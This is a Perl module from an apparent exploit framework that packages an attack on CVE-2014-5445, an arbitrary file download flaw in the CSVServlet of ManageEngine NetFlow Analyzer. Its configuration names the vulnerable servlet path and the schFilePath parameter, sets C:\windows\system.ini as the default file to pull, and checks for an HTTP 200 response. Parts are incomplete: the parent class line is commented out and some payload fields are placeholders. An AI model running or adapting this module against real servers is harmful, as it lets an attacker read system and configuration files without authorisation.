package MSFExploits::Exploits::NETFLOW::MSF::NetflowFileDownload;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::NETFLOW);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "NetflowFileDownload";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2014-5445",
  DESCRIPTION => "

        This module exploits an arbitrary file download vulnerability in CSVServlet

        on ManageEngine NetFlow Analyzer. This module has been tested on both Windows

        and Linux with versions 8.6 to 10.2. Note that when typing Windows paths, you

        must escape the backslash with a backslash.

      ",
  METHOD => "GET",
  MSF_MODULE => "netflow_file_download",
  OSVDB => 115340,
  PATH => "schFilePath=__SCHFILEPATH__&",
  PATHS => ["servlet/CSVServlet", ":\\\\windows\\\\system.ini"],
  PAYLOAD => "?",
  REFERENCES => [
    "http://seclists.org/fulldisclosure/2014/Dec/9",
    "https://github.com/pedrib/PoC/blob/master/advisories/ManageEngine/me_netflow_it360_file_dl.txt",
  ],
  TITLE => "ManageEngine NetFlow Analyzer Arbitrary File Download",
  VARIABLES => {
    'SCHFILEPATH' =>       { DESCRIPTION => "", VALUE => "" },
    'TARGETURI' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       {
  DESCRIPTION => "Path of the file to download",
  VALUE => "C:\\\\windows\\\\system.ini",
},
    'FILEPATH' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'ALL',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
